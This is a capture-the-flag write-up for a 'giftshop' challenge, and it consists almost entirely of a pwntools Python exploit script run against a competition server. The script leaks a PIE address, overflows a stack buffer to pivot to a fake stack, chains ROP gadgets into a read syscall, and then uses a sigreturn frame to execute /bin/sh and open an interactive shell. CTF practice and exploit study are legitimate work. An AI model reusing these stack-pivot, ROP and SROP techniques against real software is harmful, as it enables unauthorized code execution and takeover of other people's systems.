# giftshop
Write Up

from pwn import *
import struct

#p = process('./giftshop')
p = remote('pwn01.grandprix.whitehatvn.com', 26129)

t = 0.05

def order(buys, addr, letter):
	p.sendline('1')
	sleep(t)
	p.sendline('n')
	sleep(t)
	for buy in buys:
		p.sendline(str(buy))
		sleep(t)
	p.sendline('6')
	sleep(t)
	p.sendline('y')
	sleep(t)
	p.sendline(addr)
	sleep(t)
	# overflow
	p.sendline(letter)
	sleep(t)

p.sendline('hhhh')
sleep(t)

p.recvuntil('come here !\n')
p.recv(2) # skip 0x
data_2030d8 = int(p.recv(12), 16)
pie_base = data_2030d8 - 0x2030d8
print '[*] pie_base : '+hex(pie_base)

free_got = 0x203018
p.sendline('kkkk')
sleep(t)

fgets_gadget = pie_base + 0x18b9
fake_stack = pie_base + 0x203900

payload = ''
payload += 'a'*0xc8
payload += p64(0)
payload += p64(fake_stack+0xd0)
payload += p64(fgets_gadget)
order([1], '/bin/sh\x00', payload)

pop_rax_ret = pie_base + 0x2267
pop_rdi_ret = pie_base + 0x225f
pop_rsi_ret = pie_base + 0x2261
pop_rdx_ret = pie_base + 0x2265
binsh = fake_stack - 0x300
leave_ret = pie_base + 0x19bc
syscall = pie_base + 0x2254

payload = ''
payload += p64(fake_stack - 0x300) # pop rbp
payload += p64(pop_rsi_ret) + p64(fake_stack - 0x300) # buf
payload += p64(pop_rdx_ret) + p64(0x200) # len
payload += p64(pop_rdi_ret) + p64(0) # stdin
payload += p64(pop_rax_ret) + p64(0) # read
payload += p64(syscall)
payload += p64(leave_ret)
payload += 'a'* (0xc8 - len(payload))
payload += p64(0)
payload += p64(fake_stack)
payload += p64(leave_ret)

p.sendline(payload)
sleep(t)

payload = ''
payload += '/bin/sh\x00' # dummy rbp
payload += p64(pop_rax_ret) + p64(15) # sig_return
payload += p64(syscall)
frame = SigreturnFrame(arch="amd64")
frame.rax = 322 # execveat
frame.rdi = 0
frame.rsi = binsh # /bin/sh
frame.rdx = 0
frame.r10 = 0
frame.r8 = 0
frame.rsp = syscall
frame.rip = syscall
payload += str(frame)

p.sendline(payload)
sleep(t)

p.interactive()
